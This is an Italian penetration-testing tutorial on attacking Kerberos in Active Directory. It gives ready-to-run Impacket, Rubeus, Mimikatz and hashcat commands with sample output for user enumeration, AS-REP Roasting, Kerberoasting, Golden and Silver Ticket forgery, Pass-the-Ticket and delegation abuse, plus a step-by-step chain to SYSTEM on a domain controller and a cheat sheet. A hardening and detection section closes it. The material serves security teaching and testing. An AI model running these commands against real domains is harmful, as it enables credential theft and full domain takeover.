---
title: 'Kerberos Attacchi Active Directory: Kerberoasting, AS-REP, Golden Ticket'
slug: kerberos
description: 'Porta 88 Kerberos: guida completa al penetration testing Active Directory. Scopri Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket e Pass-the-Ticket per privilege escalation e lateral movement.'
image: '/ChatGPT Image 26 feb 2026, 12_46_57.webp'
draft: true
date: 2026-03-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - kerberoasting
  - active directory
  - porta-windows
featured: true
---

# Porta 88 — Kerberos: Il Cuore dell'Autenticazione Active Directory

Se [Active Directory](https://hackita.it/articoli/active-directory) è il sistema nervoso di ogni rete aziendale Windows, Kerberos è il suo cuore pulsante. È il protocollo di autenticazione che gestisce ogni login, ogni accesso a una share di rete, ogni connessione a un servizio. Ascolta sulla porta 88 TCP/UDP del Domain Controller e, per un pentester, è un tesoro: permette di **enumerare utenti validi senza credenziali**, estrarre hash craccabili di service account (**Kerberoasting**) e utenti senza pre-autenticazione (**AS-REP Roasting**), forgiare ticket che danno accesso illimitato al dominio (**Golden Ticket**) e persistere indefinitamente nell'ambiente.

Non esagero dicendo che il 70% dei penetration test su Active Directory che ho fatto negli ultimi anni è passato per Kerberos. È il protocollo che gli admin non toccano mai — "funziona, non ci penso" — e che i pentester conoscono meglio di loro.

Ricordo un engagement per una banca regionale: 3000 utenti AD, policy di password complessa (12 caratteri, maiuscole, numeri, speciali). Sembrava blindata. Poi ho fatto Kerberoasting e ho estratto 47 hash di service account. Il service account `svc_sqlprod` aveva password `SqlProd2019!` — conforme alla policy ma vecchia di 6 anni e mai cambiata. Con quell'account ho raggiunto il database di produzione con i dati di 180.000 clienti. La policy delle password non copriva i service account.

## Cos'è Kerberos — Per Capirlo Davvero

Kerberos funziona con un sistema di ticket:

* **[TGT](https://hackita.it/articoli/tgt) (Ticket Granting Ticket)**\
  Lo ottieni dopo il login al Domain Controller.\
  Serve per dimostrare che sei autenticato.
* **[TGS](https://hackita.it/articoli/tgs) (Service Ticket)**\
  Lo richiedi usando il TGT per accedere a un servizio (es. SMB, SQL).\
  È il ticket che usi per entrare nel servizio specifico.

```
Client                          KDC (DC :88)                Service
┌──────────────┐               ┌──────────────┐            ┌────────────┐
│ 1. AS-REQ    │──password────►│ AS (Auth Svc) │            │            │
│    "Sono Bob"│               │  Verifica pwd │            │            │
│              │◄──────────────│  "Ecco il TGT"│            │            │
│              │   AS-REP      │               │            │            │
│              │   (TGT)       │               │            │            │
│              │               │               │            │            │
│ 2. TGS-REQ  │──TGT────────►│ TGS (Ticket   │            │            │
│  "Voglio     │               │  Granting Svc)│            │            │
│   SQL Server"│◄──────────────│  "Ecco il TGS"│            │            │
│              │   TGS-REP     │               │            │            │
│              │   (TGS)       │               │            │            │
│              │               │               │            │            │
│ 3. AP-REQ   │──TGS─────────────────────────►│ SQL Server │
│              │◄──────────────────────────────│ "OK, entra"│
│              │   AP-REP                      │            │
└──────────────┘                               └────────────┘
```

| Porta                                             | Servizio     | Funzione                              |
| ------------------------------------------------- | ------------ | ------------------------------------- |
| **88**                                            | Kerberos KDC | Autenticazione e distribuzione ticket |
| [389](https://hackita.it/articoli/porta-389-ldap) | LDAP         | Directory Active Directory            |
| [445](https://hackita.it/articoli/smb)            | SMB          | File sharing, RPC                     |
| [53](https://hackita.it/articoli/porta-53-dns)    | DNS          | Risoluzione nomi AD                   |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 88 10.10.10.10
```

```
PORT   STATE SERVICE VERSION
88/tcp open  kerberos-sec  Microsoft Windows Kerberos
```

La porta 88 aperta = Domain Controller. Punto.

### Enumerazione utenti — SENZA credenziali

Kerberos risponde in modo diverso per utenti validi e inesistenti. Questo permette di enumerare senza alcuna credenziale:

```bash
# Kerbrute — brute force username
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
2026/02/14 10:00:01 >  [+] VALID USERNAME: administrator@corp.local
2026/02/14 10:00:01 >  [+] VALID USERNAME: j.rossi@corp.local
2026/02/14 10:00:02 >  [+] VALID USERNAME: m.bianchi@corp.local
2026/02/14 10:00:02 >  [+] VALID USERNAME: svc_sql@corp.local
2026/02/14 10:00:03 >  [+] VALID USERNAME: svc_backup@corp.local
```

Cinque utenti validi — inclusi due service account (`svc_sql`, `svc_backup`). Tutto senza credenziali.

```bash
# Con Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=corp.local,userdb=users.txt 10.10.10.10
```

## 2. AS-REP Roasting — Hash Senza Credenziali

Se un utente ha **"Do not require Kerberos preauthentication"** abilitato (flag `DONT_REQUIRE_PREAUTH`), puoi richiedere il suo AS-REP senza conoscere la password. L'AS-REP contiene un blob cifrato con l'hash della password dell'utente → craccabile offline con [Hashcat](https://hackita.it/articoli/hashcat).

```bash
# Impacket — trova utenti senza preauth e estrai gli hash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

```
$krb5asrep$23$svc_backup@CORP.LOCAL:abc123...hash...def456
```

```bash
# Crack con Hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$svc_backup@CORP.LOCAL:Backup2023!
```

### Senza lista utenti

```bash
# Se hai un account qualsiasi (anche low-priv), LDAP enumera chi ha il flag
impacket-GetNPUsers corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -request
```

Questo usa [LDAP](https://hackita.it/articoli/porta-389-ldap) per trovare automaticamente tutti gli utenti con `DONT_REQUIRE_PREAUTH` → estrae tutti gli hash in un colpo.

## 3. Kerberoasting — Hash di Service Account

Qualsiasi utente autenticato nel dominio può richiedere un TGS per qualsiasi servizio con un SPN (Service Principal Name) registrato. Il TGS è cifrato con l'hash della password del service account → craccabile offline. Questo è **Kerberoasting** — e funziona su ogni dominio AD che ha service account con SPN.

```bash
# Impacket — il metodo più usato
impacket-GetUserSPNs corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt
```

```
ServicePrincipalName       Name        MemberOf                         PasswordLastSet
MSSQLSvc/db01:1433         svc_sql     CN=Domain Admins,CN=Users,...    2019-03-15
HTTP/web01.corp.local      svc_web     CN=Web Admins,CN=Users,...       2021-06-20
cifs/file01.corp.local     svc_file    CN=Backup Operators,CN=...      2020-01-10

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01:1433*$abc123...
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web01.corp.local*$def456...
$krb5tgs$23$*svc_file$CORP.LOCAL$cifs/file01.corp.local*$ghi789...
```

**Intelligence critica:** `svc_sql` è **Domain Admin** e la sua password non è cambiata dal 2019 — 7 anni. Il target perfetto.

```bash
# Crack con Hashcat (mode 13100 per RC4, 19700 per AES)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*:SqlProd2019!
```

`svc_sql` è Domain Admin con password `SqlProd2019!`. Dominio compromesso.

```bash
# Con Rubeus (da una macchina Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Targetted kerberoast (un singolo utente)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash_sql.txt
```

## 4. Golden Ticket — Persistenza Totale

Se ottieni l'hash NTLM dell'account `krbtgt` (tramite [DCSync](https://hackita.it/articoli/pass-the-hash) o dump NTDS.dit), puoi forgiare TGT validi per **qualsiasi utente**, inclusi utenti inesistenti con qualsiasi gruppo. È il livello di persistenza più alto in Active Directory — sopravvive a reset di password e reinstallazioni.

```bash
# Ottieni l'hash di krbtgt (richiede Domain Admin)
impacket-secretsdump corp.local/administrator@10.10.10.10 -hashes 'aad3b435b51404ee:NTLM_HASH' -just-dc-user krbtgt
```

```
krbtgt:502:aad3b435b51404ee:f3bc61e97fb14d1c30ac3d1b51c2345e:::
```

```bash
# Forgia il Golden Ticket con Impacket
impacket-ticketer -nthash f3bc61e97fb14d1c30ac3d1b51c2345e -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local administrator
```

```bash
# Usa il ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

Shell SYSTEM sul Domain Controller con un ticket forgiato. L'unico modo per invalidarlo: reset della password di `krbtgt` **due volte** (la prima volta invalida i ticket vecchi, la seconda invalida quelli emessi tra il primo e il secondo reset).

```
# Con Mimikatz (da Windows)
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:f3bc61e97fb14d1c30ac3d1b51c2345e /ptt
```

## 5. Silver Ticket — Accesso Mirato

Il Silver Ticket forgia un TGS per un servizio specifico usando l'hash dell'account del servizio (non di krbtgt). Più stealth del Golden Ticket — non contatta il KDC.

```bash
# Silver Ticket per accedere a CIFS (file share) su file01
impacket-ticketer -nthash HASH_SVC_FILE -domain-sid S-1-5-21-... -domain corp.local -spn cifs/file01.corp.local administrator

export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass corp.local/administrator@file01.corp.local
```

## 6. Pass-the-Ticket

Se trovi un ticket Kerberos (TGT o TGS) sulla macchina compromessa:

```bash
# Mimikatz — esporta tutti i ticket dalla memoria
mimikatz # sekurlsa::tickets /export
```

```bash
# Inietta un ticket rubato
mimikatz # kerberos::ptt ticket_admin.kirbi
```

```bash
# Impacket — converti ticket .kirbi in .ccache per Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

## 7. Delegation Abuse

Le delegazioni Kerberos permettono a un servizio di agire per conto di un utente. Se mal configurate → privilege escalation.

**Unconstrained Delegation:** il servizio riceve il TGT dell'utente → può impersonarlo ovunque.

```bash
# Trova macchine con unconstrained delegation
impacket-findDelegation corp.local/j.rossi:Password1 -dc-ip 10.10.10.10
```

```
AccountName    AccountType  DelegationType              DelegationRightsTo
WEB-01$        Computer     Unconstrained               N/A
SVC_SQL        User         Constrained                 MSSQLSvc/db01:1433
```

**Constrained Delegation abuse** con Rubeus:

```bash
# Ottieni un TGS come qualsiasi utente per il servizio delegato
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:MSSQLSvc/db01:1433 /ptt
```

Ora sei `administrator` per il servizio SQL — [accesso completo al database](https://hackita.it/articoli/porta-3306-mysql).

## 8. Micro Playbook Reale

**Minuto 0-3 → Conferma DC e enumerazione utenti**

```bash
nmap -sV -p 88,389,445 10.10.10.10
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt
```

**Minuto 3-10 → AS-REP Roasting (non serve auth)**

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users_trovati.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

**Minuto 10-20 → Kerberoasting (serve qualsiasi credenziale)**

```bash
impacket-GetUserSPNs corp.local/USER:PASS -dc-ip 10.10.10.10 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

**Se ottengo Domain Admin → Golden Ticket per persistenza**

```bash
impacket-secretsdump corp.local/admin@DC -just-dc-user krbtgt
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain corp.local fakeadmin
```

Questo è il mio flusso standard in ogni pentest AD. In 20 minuti ho una lista di hash da crackare offline senza aver generato un singolo alert di lockout.

## 9. Caso Studio Concreto

**Settore:** Banca regionale, 3000 utenti, policy password 12 caratteri complessa.

**Scope:** Pentest interno, accesso a una workstation con credenziali standard `g.verdi:Welcome1!`.

Ho iniziato con Kerberoasting: `GetUserSPNs` ha restituito 47 service account con SPN. Ho crackato gli hash offline — 12 su 47 sono caduti in meno di un'ora. Il primo a cadere: `svc_sqlprod` con password `SqlProd2019!` — conforme alla policy (12 char, maiuscola, numero, speciale) ma vecchia di 6 anni e mai ruotata.

`svc_sqlprod` era membro di **Domain Admins** — pratica comune per i service account SQL che "devono accedere a tutto". Con quell'account ho fatto DCSync, estratto tutti gli hash NTLM del dominio (3000 utenti), e forgiato un Golden Ticket.

**Tempo dal login alla compromissione del dominio:** 2 ore e 40 minuti, di cui 2 ore per il cracking Hashcat.

**Root cause:** Service account Domain Admin con password statica vecchia di 6 anni. Nessun monitoraggio Kerberoasting (Event ID 4769 con RC4 encryption). Nessuna rotazione automatica delle password dei service account.

## 10. Errori Comuni Reali Trovati nei Pentest

**1. Service account Domain Admin (80% dei domini)**
L'errore più diffuso in assoluto. `svc_sql`, `svc_backup`, `svc_scom` sono Domain Admin "perché era più facile". Kerberoasting + crack = dominio compromesso.

**2. Password statiche sui service account**
Le password dei service account non vengono mai cambiate. Trovo regolarmente password del 2017-2019 su ambienti attuali. La Group Managed Service Account (gMSA) risolve il problema ma pochissimi la usano.

**3. Utenti con DONT\_REQUIRE\_PREAUTH**
Il flag "Do not require Kerberos preauthentication" abilitato per "risolvere un problema di compatibilità" e mai rimosso. AS-REP Roasting senza credenziali.

**4. Unconstrained Delegation su server non-DC**
Macchine con unconstrained delegation → un attaccante forza un Domain Controller a autenticarsi (PrinterBug/PetitPotam) e cattura il TGT del DC → Golden Ticket.

**5. AES vs RC4**
I ticket Kerberos crittografati con RC4 (NTLM hash) sono molto più veloci da crackare rispetto ad AES. La maggior parte dei domini ancora permette RC4 per retrocompatibilità. Un domain controller che accetta RC4 = Kerberoasting molto più veloce.

**6. Nessun monitoraggio degli Event ID Kerberos**
L'Event ID 4769 (TGS request) con encryption type 0x17 (RC4) è il segnale classico del Kerberoasting. Quasi nessuno lo monitora.

## 11. Mini Chain Offensiva Reale

```
Kerberos :88 → User Enum → AS-REP Roast → Credenziali → Kerberoast → DA → DCSync → Golden Ticket
```

**Step 1 — Enumerazione utenti senza credenziali**

```bash
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# → 25 utenti validi inclusi 3 service account
```

**Step 2 — AS-REP Roasting**

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile utenti_validi.txt -format hashcat
# → svc_backup ha DONT_REQUIRE_PREAUTH → hash estratto
hashcat -m 18200 asrep.txt rockyou.txt
# → svc_backup:Backup2023!
```

**Step 3 — Kerberoasting con le credenziali ottenute**

```bash
impacket-GetUserSPNs corp.local/svc_backup:Backup2023! -dc-ip 10.10.10.10 -request
# → 47 hash TGS estratti
hashcat -m 13100 kerberoast.txt rockyou.txt
# → svc_sqlprod:SqlProd2019! (Domain Admin)
```

**Step 4 — DCSync e Golden Ticket**

```bash
impacket-secretsdump corp.local/svc_sqlprod:SqlProd2019!@10.10.10.10 -just-dc-ntlm
# → krbtgt hash, tutti gli hash utente
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain corp.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec -k -no-pass corp.local/fakeadmin@dc01.corp.local
# → SYSTEM sul Domain Controller
```

**Partito senza credenziali → Domain Admin → persistenza permanente.** Tutto tramite la porta 88.

## 12. Detection & Hardening

* **gMSA** — Group Managed Service Accounts con rotazione automatica della password
* **Rimuovi service account da Domain Admins** — principio del minimo privilegio
* **Disabilita RC4** dove possibile — forza AES-256
* **Monitora Event ID 4769** con encryption type 0x17 (RC4) — segnale di Kerberoasting
* **Monitora Event ID 4768** senza pre-auth — segnale di AS-REP Roasting
* **Rimuovi DONT\_REQUIRE\_PREAUTH** da tutti gli utenti
* **Password lunghe (>25 char) per service account** — rende il cracking impraticabile
* **Elimina unconstrained delegation** su macchine non-DC
* **Protected Users group** per account privilegiati
* **Reset krbtgt** periodicamente (dopo un breach: due volte)

## 13. Mini FAQ

**Il Kerberoasting genera alert?**
Non di default: è una richiesta TGS legittima. Però genera Event ID 4769 con encryption type RC4 (0x17), che è anomalo se il dominio supporta AES. Pochi ambienti monitorano questo evento — ma i SOC evoluti lo fanno.

**Posso fare Kerberoasting senza credenziali?**
No — serve almeno un account autenticato nel dominio per richiedere i TGS. Ma puoi ottenere le credenziali con AS-REP Roasting (che invece non richiede auth) o con [Responder](https://hackita.it/articoli/responder).

**Cos'è il Golden Ticket e come lo invalido?**
Un TGT forgiato con l'hash di `krbtgt`, valido per qualsiasi utente e gruppo. L'unico modo per invalidarlo: reset della password di `krbtgt` due volte consecutivamente. La prima invalidazione richiede fino a 10 ore per propagarsi.

## 14. Cheat Sheet Finale

| Azione          | Comando                                                                         |
| --------------- | ------------------------------------------------------------------------------- |
| Nmap            | `nmap -sV -p 88 target`                                                         |
| User enum       | `kerbrute userenum -d DOMAIN --dc DC users.txt`                                 |
| AS-REP Roast    | `impacket-GetNPUsers DOMAIN/ -dc-ip DC -usersfile users.txt -format hashcat`    |
| Crack AS-REP    | `hashcat -m 18200 hashes.txt wordlist`                                          |
| Kerberoast      | `impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC -request`                      |
| Crack TGS       | `hashcat -m 13100 hashes.txt wordlist`                                          |
| Golden Ticket   | `impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOM admin`       |
| Silver Ticket   | `impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain DOM -spn SPN admin` |
| Pass-the-Ticket | `export KRB5CCNAME=ticket.ccache` → `impacket-psexec -k -no-pass`               |
| Delegation      | `impacket-findDelegation DOMAIN/user:pass -dc-ip DC`                            |
| Rubeus Kerb     | `Rubeus.exe kerberoast /outfile:hashes.txt`                                     |
| Rubeus S4U      | `Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:admin /msdsspn:SPN /ptt`   |
| DCSync          | `impacket-secretsdump DOMAIN/admin@DC -just-dc-ntlm`                            |

***

Riferimento: Microsoft Kerberos docs, MITRE ATT\&CK T1558, Impacket, Rubeus, HackTricks Kerberos. Uso esclusivo in ambienti autorizzati.

> Kerberos è il protocollo che decide chi entra nella tua rete. Sai se i tuoi service account sono Domain Admin con password del 2019? [Penetration test AD HackIta](https://hackita.it/servizi) per verificare. Per padroneggiare l'exploitation Active Directory: [formazione 1:1 avanzata](https://hackita.it/formazione).
